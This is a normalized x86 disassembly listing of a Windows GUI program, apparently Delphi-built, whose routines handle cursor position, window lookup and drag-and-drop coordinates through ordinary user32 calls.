mov edx eax
mov eax esi
call sub_44f1cc
mov edi eax
jmp r-xdata
sub_447d30
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_447c10
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4521fc
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_447c60
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_447c60
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_449964
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_447c60
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4677f4
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4521b8
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_447c9c
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403350
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_4522e4
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_4521fc
jmp r-xdata
mov eax [ rw-data ]
call sub_452358
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4677f4
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_449964
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403350
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403350
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407dd8
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_448000
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_44722c
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4521fc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_447d30
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_448170
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_448315
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403350
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403350
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_447534
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_448000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44741c
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_45071c
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_416efc
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_449938
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_416efc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_448334
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403350
mov ebx eax
sub_4483a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_448674
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_448602
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_447274
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403304
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_448334
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_447c60
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_452358
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448609
mov eax [ rw-data ]
call sub_403154
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_460ae8
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_44afd4
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_447b2c
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_464754
sub_448609
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403154
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4032e0
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
sub_448698
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_446d00
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_4486cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_448698
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_449964
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_44e008
test eax eax
je r-xdata
mov esi eax
sub_448714
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_418454
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx ] eax
sub_44873c
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_41874c
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403154
xor eax eax
mov [ ebx ] eax
sub_44875c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44878c
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_418974
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44883c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4189d8
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_448815
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_4489c8
call sub_4039b4
call sub_4039b4
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4185b0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_424e54
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_448848
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418974
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4488e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4488ed
mov eax [ rw-data ]
call sub_4189d8
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4488be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4489c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_424eb0
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4185b0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_424e54
test al al
je r-xdata
sub_4488f4
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_4489c8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424a08
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_448920
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_425034
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_425038
mov eax [ ebp - 0x4 ]
call sub_448a14
mov eax [ rw-data ]
call sub_418974
mov ebx eax
xor eax eax
push ebp
push sub_4489a5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_418454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4189d8
retn
call sub_44878c
sub_4489c8
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_425038
mov edx ebx
mov eax [ rw-data ]
call sub_418988
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_448a14
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44a464
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_448a40
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403124
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_448a7c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418c90
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_448ac4
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_448b80
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_448c4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448c54
lea eax [ ebp - 0x1c ]
call sub_403f50
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403350
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_459248
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408df4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403fa4
sub_448c70
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_448cd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_456268
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_449e20
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov edx [ eax + 0x64 ]
pop eax
call sub_40435c
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448cde
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov al 0x1
sub_448ce4
push ebx
mov ebx eax
mov eax ebx
call sub_456290
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_448d18
push ebx
mov ebx eax
mov eax ebx
call sub_4562e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_40435c
je r-xdata
mov al 0x1
pop ebx
retn
sub_448d50
push ebx
mov ebx eax
mov eax ebx
call sub_45631c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_448d84
push ebx
mov ebx eax
mov eax ebx
call sub_4218bc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_448dac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_449e50
sub_448dcc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_448dec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403fa4
sub_448e10
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_449d40
sub_448e30
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_448e5c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_40435c
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov al [ edi + 0x70 ]
